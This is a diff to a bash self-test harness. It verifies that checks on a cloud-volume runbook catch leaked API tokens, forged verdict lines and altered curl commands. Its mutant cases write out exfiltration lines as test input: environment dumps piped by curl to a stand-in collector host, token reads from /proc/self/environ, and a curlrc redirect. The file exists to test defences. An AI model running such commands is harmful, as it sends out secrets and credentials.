+_iv_entryok() { _iv_ran; printf 'verdict=matches-declared\n' > "$CASE/out/probe"; printf 'sole-copy-check verdict=matches-declared entry=%s expected=true\n::warning::sole-copy-check verdict=x: a note\n' "$ENTRY" > "$CASE/probe.log"; printf 'sole-copy-check verdict=matches-declared entry=%s (clean)\n' "$ENTRY" > "$CASE/gate.log"; }
+_iv_forgedverdict() { _iv_entryok; printf 'verdict=unprotected-as-declared\n' > "$CASE/out/probe"; }   # both lines claim matches-declared
+_iv_forgedprobe() { _iv_entryok; printf 'verdict=unprotected-as-declared\n' > "$CASE/out/probe"; printf 'sole-copy-check verdict=unprotected-as-declared entry=%s (clean)\n' "$ENTRY" > "$CASE/gate.log"; }   # the probe line alone
+_iv_forgedgate() { _iv_entryok; printf 'verdict=unprotected-as-declared\n' > "$CASE/out/probe"; printf 'sole-copy-check verdict=unprotected-as-declared entry=%s expected=true\n' "$ENTRY" > "$CASE/probe.log"; }   # the gate line alone
 _iv_noprobeline() { _iv_entryok; printf '::warning::sole-copy-check verdict=x: a note\n' > "$CASE/probe.log"; }
 _iv_nogateline() { _iv_entryok; printf 'sole-copy-check clean\n' > "$CASE/gate.log"; }
 _iv_twogatelines() { _iv_entryok; printf '::error::sole-copy-check verdict=none entry=%s http=none\n' "$ENTRY" >> "$CASE/gate.log"; }
@@ -2241,9 +2285,9 @@ _iv_otherid() { printf 'x %s y\n' "$OTHER_ID" > "$CASE/zz.log"; }
 _iv_commits() { echo "gh api commits path=some-other-file" >> "$SEQ"; }
 _iv_good() { printf 'https://api.hetzner.cloud/v1/volumes?name=%s&per_page=50\0' "$CASE_NAME" > "$CASE/curl.1.argv"; printf 'header = "Authorization: Bearer %s"' "$CASE_TOK" > "$CASE/curl.1.stdin"; }
 _hv=""
-for _f in _iv_leak _iv_prefix _iv_rwleak _iv_rwprefix _iv_dopleak _iv_dopprefix _iv_argvprefix _iv_argvrw _iv_argvrwprefix _iv_canary _iv_ghenv _iv_refused _iv_heredoc _iv_url _iv_cred _iv_argvtok _iv_noentry _iv_otherentry _iv_entrylate _iv_noprobeline _iv_nogateline _iv_twogatelines _iv_othername _iv_otherid _iv_commits; do _inv_fires "$_f" || _hv+=" $_f"; done
+for _f in _iv_leak _iv_prefix _iv_rwleak _iv_rwprefix _iv_dopleak _iv_dopprefix _iv_argvprefix _iv_argvrw _iv_argvrwprefix _iv_canary _iv_ghenv _iv_refused _iv_heredoc _iv_url _iv_cred _iv_argvtok _iv_noentry _iv_otherentry _iv_entrylate _iv_noprobeline _iv_nogateline _iv_twogatelines _iv_forgedverdict _iv_forgedprobe _iv_forgedgate _iv_othername _iv_otherid _iv_commits; do _inv_fires "$_f" || _hv+=" $_f"; done
 for _f in _iv_clean _iv_good _iv_entryok; do if _inv_fires "$_f"; then _hv+=" CONTROL:$_f"; fi; done
-if [[ -z "$_hv" ]]; then pass "H5 invariants() flags a leaked token (read-only, read/write or Doppler), a 6-character prefix of each, a token or prefix on argv, a label canary, a non-empty GITHUB_ENV, a stub refusal, a heredoc output, a wrong request URL, a wrong credential channel, a token on argv, a verdict log line with no entry, another entry or entry= not directly after verdict=, a probe or gate that ran and printed no verdict line, a gate that printed two, the other entry's name on a request or id in a stream, and a commits read of another file, and stays quiet for a clean case and for correct verdict lines beside a ::warning:: one"
+if [[ -z "$_hv" ]]; then pass "H5 invariants() flags a leaked token (read-only, read/write or Doppler), a 6-character prefix of each, a token or prefix on argv, a label canary, a non-empty GITHUB_ENV, a stub refusal, a heredoc output, a wrong request URL, a wrong credential channel, a token on argv, a verdict log line with no entry, another entry or entry= not directly after verdict=, a probe or gate that ran and printed no verdict line, a gate that printed two, a probe or gate verdict line naming another verdict than the published one, the other entry's name on a request or id in a stream, and a commits read of another file, and stays quiet for a clean case and for correct verdict lines beside a ::warning:: one"
 else fail "H5 invariants self-test: not flagged or falsely flagged:$_hv"; fi
 CASE_N=$((CASE_N + 1))
 _h6=$( new_case; go
@@ -2375,22 +2419,33 @@ mut_lit "$RB6604" "$TMP/n1c/rb.vb404.md" "$_vbs" '^   > ' "${_r404:-@@none@@}'" 
 n1c_mut verify-block-404-get-names-the-pin "$ADR119" "$TMP/n1c/rb.vb404.md"
 if [[ -z "$_h14" ]]; then pass "H14 N1c goes RED on a copy with a second 'Hetzner id' in the addendum, an empty addendum, the id moved outside the section, an emptied runbook read-back section, (equal counts, wrong id) the addendum, the read-back GET, the verify-block volume GET or the verify-block 'expect [id]' naming the inngest id, and the verify block's expect-404 GET naming the pin"
 else fail "H14 N1c section-bound self-test: not caught:$_h14"; fi
-# H15: the read-only command-line check (each mutant on a copy; each must fail rb_cmdline_ok). The "moved" mutants MOVE the
-# Authorization header from curl's stdin config to its argument list (the Authorization count stays 1, the exact printf construct
-# is gone); the "kept" ones keep the printf construct and add a second token channel (the token-name count becomes 4).
+# H15: the read-only command-line check (each mutant on a copy; each must fail rb_cmdline_ok, the exact-text pin). The "moved"
+# mutants MOVE the Authorization header from curl's stdin config to its argument list; the "kept" ones keep the printf construct
+# and add a second token channel; the verification-pass ones (V3) read the token without naming it, drop the curl confinement,
+# change the quoting, or add a line to the block.
 _h15=""
-rb_mut() { # rb_mut <label> <rb|vb> <sed commands applied to the target line: the read-back section's doppler line (rb) or the 4th
-  # doppler line of the "Verify the retired end state" block (vb)>
-  awk -v t="$2" '/^## Read back the delete-protection flag \(read-only token\)$/{r=1} /^## /&&!/^## Read back the delete-protection flag/{r=0}
+_rb_mark() { # _rb_mark <rb|vb>: runbook 6604 with the target line prefixed @@CMD@@: the read-back section's doppler line (rb) or
+  # the 4th doppler line of the "Verify the retired end state" block (vb)
+  awk -v t="$1" '/^## Read back the delete-protection flag \(read-only token\)$/{r=1} /^## /&&!/^## Read back the delete-protection flag/{r=0}
     /\*\*Verify the retired end state/{v=1} v && /^   > /{v=0}
-    { m = 0; if (/^[ \t]*doppler run /) { if (t == "rb" && r) m = 1; if (t == "vb" && v && ++n == 4) m = 1 } print (m ? "@@CMD@@" $0 : $0) }' "$RB6604" \
-    | sed -e "/^@@CMD@@/{$3}" -e 's/^@@CMD@@//' > "$TMP/n1c/rb.$1.md"
-  if cmp -s "$TMP/n1c/rb.$1.md" "$RB6604"; then _h15+=" $1(did-not-land)"; return; fi
-  if rb_cmdline_ok "$TMP/n1c/rb.$1.md"; then _h15+=" $1"; fi
+    { m = 0; if (/^[ \t]*doppler run /) { if (t == "rb" && r) m = 1; if (t == "vb" && v && ++n == 4) m = 1 } print (m ? "@@CMD@@" $0 : $0) }' "$RB6604"
 }
-_mv='s/Authorization: Bearer %s/X-Note: %s/;s/curl -sS --config - /curl -sS --config - '   # + <spelling> /: the header moves to argv
+_rb_judge() { # _rb_judge <label>: the copy must differ from the real runbook and rb_cmdline_ok must refuse it
+  if cmp -s "$TMP/n1c/rb.$1.md" "$RB6604"; then _h15+=" $1(did-not-land)"; return; fi
+  if rb_cmdline_ok "$TMP/n1c/rb.$1.md" "$_wpin"; then _h15+=" $1"; fi
+}
+rb_mut() { # rb_mut <label> <rb|vb> <sed commands applied to the target line>
+  _rb_mark "$2" | sed -e "/^@@CMD@@/{$3}" -e 's/^@@CMD@@//' > "$TMP/n1c/rb.$1.md"; _rb_judge "$1"
+}
+rb_put() { # rb_put <label> <rb|vb> <text>: the target line becomes <text> (the line's own indentation first), or, when <text>
+  # holds @@SELF@@, <text> with the original line in its place. Passed through the environment, so no character is reinterpreted.
+  _rb_mark "$2" | RB_NEW="$3" awk 'index($0, "@@CMD@@") == 1 { o = substr($0, 8); n = ENVIRON["RB_NEW"]; i = index(n, "@@SELF@@")
+      if (i) { print substr(n, 1, i - 1) o substr(n, i + 8) } else { match(o, /^[ \t]*/); print substr(o, 1, RLENGTH) n }; next } { print }' \
+    > "$TMP/n1c/rb.$1.md"; _rb_judge "$1"
+}
+_mv='s/Authorization: Bearer %s/X-Note: %s/;s/ -sS --config - / -sS --config - '   # + <spelling> /: the header moves to argv
 rb_mut second-only-secrets rb 's/--only-secrets HCLOUD_TOKEN_READONLY /--only-secrets HCLOUD_TOKEN_READONLY --only-secrets HCLOUD_TOKEN /'
-rb_mut argv-header rb 's/curl -sS --config - /curl -sS -H "Authorization: Bearer $HCLOUD_TOKEN_READONLY" --config - /'
+rb_mut argv-header rb 's/ -sS --config - / -sS -H "Authorization: Bearer $HCLOUD_TOKEN_READONLY" --config - /'
 rb_mut fallback-expansion rb 's/"\$HCLOUD_TOKEN_READONLY" | curl/"${HCLOUD_TOKEN_READONLY:-$HCLOUD_TOKEN}" | curl/'
 rb_mut moved-H rb "${_mv}"'-H "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
 rb_mut moved-header-spaced rb "${_mv}"'--header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
@@ -2398,18 +2453,18 @@ rb_mut moved-header-equals rb "${_mv}"'--header="Authorization: Bearer $HCLOUD_T
 rb_mut moved-H-glued-bare rb "${_mv}"'-HAuthorization:"Bearer $HCLOUD_TOKEN_READONLY" /'
 rb_mut moved-H-glued-quoted rb "${_mv}"'-H"Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
 rb_mut moved-H-in-cluster rb "${_mv}"'-sSH "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
-rb_mut H-from-a-variable rb 's/curl -sS --config - /curl -sS --config - -H "$HDR" /'
-rb_mut oauth2-bearer rb 's/curl -sS --config - /curl -sS --config - --oauth2-bearer "$HCLOUD_TOKEN_READONLY" /'
-rb_mut second-authorization rb 's/curl -sS --config - /curl -sS --config - --proxy-header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
+rb_mut H-from-a-variable rb 's/ -sS --config - / -sS --config --H "$HDR" /'
+rb_mut oauth2-bearer rb 's/ -sS --config - / -sS --config ---oauth2-bearer "$HCLOUD_TOKEN_READONLY" /'
+rb_mut second-authorization rb 's/ -sS --config - / -sS --config ---proxy-header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
 # Review round 2: spellings no list named; each is caught by the exact constructs and the token-name count, not by a spelling.
 rb_mut moved-H-quoted rb "${_mv}"'"-H" "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
 rb_mut moved-proxy-header rb "${_mv}"'--proxy-header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
 rb_mut moved-header-abbreviated rb "${_mv}"'--heade "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
 rb_mut moved-flag-in-a-variable rb "${_mv}"'$F "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
 rb_mut moved-expand-header rb "${_mv}"'--expand-header "Authorization: Bearer $HCLOUD_TOKEN_READONLY" /'
-rb_mut kept-oauth2-abbreviated rb 's/curl -sS --config - /curl -sS --config - --oauth2-bea "$HCLOUD_TOKEN_READONLY" /'
-rb_mut kept-user-password rb 's/curl -sS --config - /curl -sS --config - -u ":$HCLOUD_TOKEN_READONLY" /'
-rb_mut kept-url-credentials rb 's/curl -sS --config - /curl -sS --config - --url "https:\/\/x:$HCLOUD_TOKEN_READONLY@api.hetzner.cloud\/" /'
+rb_mut kept-oauth2-abbreviated rb 's/ -sS --config - / -sS --config ---oauth2-bea "$HCLOUD_TOKEN_READONLY" /'
+rb_mut kept-user-password rb 's/ -sS --config - / -sS --config --u ":$HCLOUD_TOKEN_READONLY" /'
+rb_mut kept-url-credentials rb 's/ -sS --config - / -sS --config ---url "https:\/\/x:$HCLOUD_TOKEN_READONLY@api.hetzner.cloud\/" /'
 rb_mut kept-second-curl-user rb "s/esac'\$/esac; curl -sS -u \":\$HCLOUD_TOKEN_READONLY\" https:\\/\\/api.hetzner.cloud\\/v1\\/volumes'/"   # only the name count sees it
 rb_mut wrapper-other-config rb 's/-c prd_terraform --only-secrets/-c prd --only-secrets/'                   # only the exact wrapper sees these two
 rb_mut wrapper-exits-on-missing rb 's/ --no-exit-on-missing-only-secrets / /'
@@ -2418,7 +2473,17 @@ rb_mut vb-read-write-token vb 's/--only-secrets HCLOUD_TOKEN_READONLY /--only-se
 rb_mut vb-line-deleted vb 'd'
 rb_mut vb-jq-outside-the-wrapper vb "s/$_wpin | jq \"\\.volume\\.protection\\.delete\"'/$_wpin' | jq \".volume.protection.delete\"/"
 rb_mut vb-jq-outside-single-quoted vb "s/$_wpin | jq \"\\.volume\\.protection\\.delete\"'/$_wpin' | jq '.volume.protection.delete'/"
-if [[ -z "$_h15" ]]; then pass "H15 the read-only command-line check fails, on a copy each: a second --only-secrets of the read/write name, an argv bearer header, a fallback expansion, the header moved to argv as -H, --header, --header=, -HAuthorization, -H\"Authorization, -sSH, \"-H\", --proxy-header, --heade, a flag in a variable, --expand-header, a -H from a variable, --oauth2-bearer, --oauth2-bea, -u, a URL with credentials, a second Authorization (--proxy-header), a second curl reading the token with -u, another Doppler config, the wrapper without --no-exit-on-missing-only-secrets; and in the verify block an argv header, the read/write token, a deleted line, jq moved outside the wrapper (double- or single-quoted filter)"
+# Verification pass (V3): the token read without its name appearing a fourth time, the confinement dropped, another quoting.
+rb_mut vb-env-piped-out-before vb 's/exit 3; }; printf "header/exit 3; }; env | curl --data-binary @- https:\/\/collector.invalid\/; printf "header/'
+rb_mut vb-printenv-piped-out-after-jq vb "s/delete\"'/delete\"; printenv | curl -d @- https:\\/\\/collector.invalid\\/'/"
+rb_mut vb-spliced-name-second-curl vb 's/exit 3; }; printf "header/exit 3; }; curl -sS --oauth2-bearer "$(printenv HCLOUD_TOKEN_R""EADONLY)" -o \/dev\/null https:\/\/api.hetzner.cloud\/v1\/volumes; printf "header/'
+rb_mut vb-proc-environ vb 's/exit 3; }; printf "header/exit 3; }; T=$(tr "\\0" "\\n" <\/proc\/self\/environ | grep _READONLY=); curl -sS -H "X-T: $T" https:\/\/api.hetzner.cloud\/v1\/volumes; printf "header/'
+rb_mut vb-curlrc-redirect vb 's/exit 3; }; printf "header/exit 3; }; printf "connect-to = api.hetzner.cloud:443:collector.invalid:443\\n" > \/tmp\/c\/.curlrc; export CURL_HOME=\/tmp\/c; printf "header/'
+rb_mut rb-without-disable rb 's/curl --disable --noproxy "\*" /curl --noproxy "*" /'
+rb_mut vb-without-noproxy vb 's/curl --disable --noproxy "\*" /curl --disable /'
+rb_put vb-double-quoted-wrapper vb 'doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY -- sh -c "[ -n \$HCLOUD_TOKEN_READONLY ] || exit 3" && printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 https://api.hetzner.cloud/v1/volumes/'"$_wpin"' | jq .volume.protection.delete   # expect true after the SSH-stage apply'"'"
+rb_put vb-extra-line-in-the-block vb '@@SELF@@'$'\n''     env | curl --data-binary @- https://collector.invalid/'
+if [[ -z "$_h15" ]]; then pass "H15 the read-only command-line check (the five lines pinned as exact text) fails, on a copy each: a second --only-secrets of the read/write name, an argv bearer header, a fallback expansion, the header moved to argv as -H, --header, --header=, -HAuthorization, -H\"Authorization, -sSH, \"-H\", --proxy-header, --heade, a flag in a variable, --expand-header, a -H from a variable, --oauth2-bearer, --oauth2-bea, -u, a URL with credentials, a second Authorization (--proxy-header), a second curl reading the token with -u, another Doppler config, the wrapper without --no-exit-on-missing-only-secrets, curl without --disable; and in the verify block an argv header, the read/write token, a deleted line, jq moved outside the wrapper (double- or single-quoted filter), env or printenv piped to another host before the construct or after jq, a second curl on a spliced token name, the token read from /proc/self/environ, a curlrc redirect written and exported, curl without --noproxy, a double-quoted wrapper with the request outside it, and an extra line in the block"
 else fail "H15 read-only command-line self-test: not caught:$_h15"; fi
 # H16 (negative controls for the text helpers): each is fed a scenario that must pass and one that must fail, inside a subshell
 # (the counters of the real run never move); SCEN_N and CASE_N are bumped first, so the subshell's directories are fresh.
@@ -2485,7 +2550,19 @@ mut_lit "$WF" "$TMP/n4/job.perrow.yml" "$_jcs" "$_jce" "and the forcing function
 n4_mut job-per-row-forcing-function "$ADR119" "$TMP/n4/job.perrow.yml"
 mut_lit "$ADR119" "$TMP/n4/adr.web1b4.md" "$_adrs" '^## ' "issue is the only forcing function." "issue is a note. Unlike the Inngest volume, which needs a $_p, Guard B4 is the web-1 forcing function."
 n4_mut adr-guard-b4-is-the-web-1-forcing-function "$TMP/n4/adr.web1b4.md" "$WF"
-if [[ -z "$_h17" ]]; then pass "H17 N4 goes RED on a copy with the phrase removed from the ADR addendum or the job comment, 'the forcing function is Guard B4' in either, the phrase moved out of the addendum or below the job header, the marker removed from either or naming inngest, 'never the Date shape' removed, 'Re-evaluate by' added, 'Guard B4 is the forcing function', the marker moved into the drift-check comment, a per-row forcing function naming B4, and 'Guard B4 is the web-1 forcing function'"
+# Verification pass (V5): a dotted path between B4 and "forcing function" (the old [^.]* pairing stopped at its dot), the
+# past-date exit or the leg condition put back to a Date-shape closure, and the other preposition of the trigger phrase.
+mut_lit "$ADR119" "$TMP/n4/adr.dotted.md" "$_adrs" '^## ' "issue is the only forcing function." "issue is the only forcing function. In practice Guard B4 in \`apps/web-platform/infra/workspaces-luks.test.sh\` is the web-1 forcing function."
+n4_mut adr-b4-pairing-across-a-dotted-path "$TMP/n4/adr.dotted.md" "$WF"
+mut_lit "$ADR119" "$TMP/n4/adr.exit0.md" "$_adrs" '^## ' "after it 5 (ACTION REQUIRED)" "after it 0 (PASS)"
+n4_mut adr-exit-0-past-the-date "$TMP/n4/adr.exit0.md" "$WF"
+mut_lit "$WF" "$TMP/n4/job.exit0.yml" "$_jcs" "$_jce" "5 after it" "0 after it"
+n4_mut job-exit-0-past-the-date "$ADR119" "$TMP/n4/job.exit0.yml"
+mut_lit "$ADR119" "$TMP/n4/adr.ran.md" "$_adrs" '^## ' "job succeeded and emitted" "job ran, or emitted"
+n4_mut adr-leg-ran-not-succeeded "$TMP/n4/adr.ran.md" "$WF"
+mut_lit "$WF" "$TMP/n4/job.reevalon.yml" "$_jcs" "$_jce" "that issue is the only forcing function;" "that issue is the only forcing function (re-evaluate on 2026-12-01, a Date-shape probe);"
+n4_mut job-re-evaluate-on "$ADR119" "$TMP/n4/job.reevalon.yml"
+if [[ -z "$_h17" ]]; then pass "H17 N4 goes RED on a copy with the phrase removed from the ADR addendum or the job comment, 'the forcing function is Guard B4' in either, the phrase moved out of the addendum or below the job header, the marker removed from either or naming inngest, 'never the Date shape' removed, 'Re-evaluate by' or 're-evaluate on' added, 'Guard B4 is the forcing function', the marker moved into the drift-check comment, a per-row forcing function naming B4, 'Guard B4 is the web-1 forcing function' (also across a dotted path), the past-date exit 0 in either text, and a leg that ran rather than succeeded"
 else fail "H17 N4 self-test: not caught:$_h17"; fi
 
 cmp -s "$LIBREAL" "$TMP/lib/bearer-curl.sh" || fail "Z0 the library copy drifted during the run"
